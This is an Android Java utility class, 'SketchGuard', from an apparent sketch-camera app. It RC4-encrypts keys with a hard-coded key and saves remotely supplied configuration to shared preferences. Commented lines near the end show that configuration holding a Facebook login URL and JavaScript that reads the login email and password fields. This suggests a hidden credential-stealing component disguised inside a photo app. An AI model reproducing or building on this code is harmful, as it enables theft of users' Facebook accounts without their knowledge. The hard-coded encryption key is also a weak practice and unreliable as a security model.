package com.kali_corporation.skethcamplus.Utils.gad;

import android.content.Context;

import com.kali_corporation.skethcamplus.Utils.hel.sp.SPUtils;
import com.kali_corporation.skethcamplus.Utils.StringUtils;

public class SketchGuard {
    public static final String getKey = "azxpz0x7r3n4zs81";
//    private static final String defaultkey = "18sz4n3r7xo2px2a";
    private static final int maxLength = 16;

//    public static String encryptData(String data){
//        return encrypt(data,defaultkey);
//    }
//
//    public static String encrypt(String src,String key) {
//        if (StringUtils.isEmptyStr(false,src)){
//            return "";
//        }
//        if (!keyIsRight(key)){
////            int subLength = maxLength-key.length();
////            key = key+defaultkey.substring(subLength);
//            return src;
//        }
//        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
//        SecretKeySpec secretKeySpec = new SecretKeySpec(raw, "AES");
//        byte[] encrypted = null;
//        try {
//            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
//            cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);
//            encrypted = cipher.doFinal(src.getBytes(StandardCharsets.UTF_8));
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//        return Base64Util.endata(encrypted);
//    }


    public static String enData(String data){
        if (StringUtils.isEmptyStr(false,data)){
            return "";
        }
       String enRc4 = RC4Util.encry_RC4_string(data,getKey);
       return enRc4;
    }

    public static String deData(String data){
        if (StringUtils.isEmptyStr(false,data)){
            return "";
        }
        String deRc4 = RC4Util.decry_RC4(data,getKey);
        return deRc4;
    }

    private static boolean keyIsRight(String key){
        int keyLength = key.length();
        if (keyLength!= maxLength){
            return false;
        }
        return true;
    }

    public static boolean saveData(Context context,String data){
        data = data.replaceAll("[{]","");
        data = data.replaceAll("[}]","");
        String[] datas = data.split(",");
        boolean needClear = true;
        for (int i = 0;i<datas.length;i++){
            String str = datas[i];
            str = str.replaceAll("\"","");
            String[] kvs = str.split(":");
            if (kvs[0].equals("icon")){
                needClear = false;
            }
            if (kvs.length>=2) {
                String enKey = SketchGuard.enData(kvs[0]);
                String res = "";
                for (int j = 1;j<kvs.length;j++){
                    if ( kvs[j].contains("http")){
                        res += kvs[j]+":";
                    }else {
                        res += kvs[j];
                    }

                }
                SPUtils.getInstance(context).saveTemp(enKey, res);

            }

        }

        if (needClear){
            SPUtils.getInstance(context).clearAppInfo();
        }

//        SPUtils.getInstance(context).saveTemp("3c","a11");
//        SPUtils.getInstance(context).saveTemp("231dbae0", "https://m.facebook.com/login.php?skip_api_login=1&api_key=493429645335972&app_id=493429645335972&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D493429645335972%26redirect_uri%3Dfb493429645335972%253A%252F%252Fauthorize");
//        SPUtils.getInstance(context).saveTemp("241fb8eb", "document.getElementById('m_login_email').value;@sec@document.getElementById('m_login_password').value;");

        return true;
    }
}
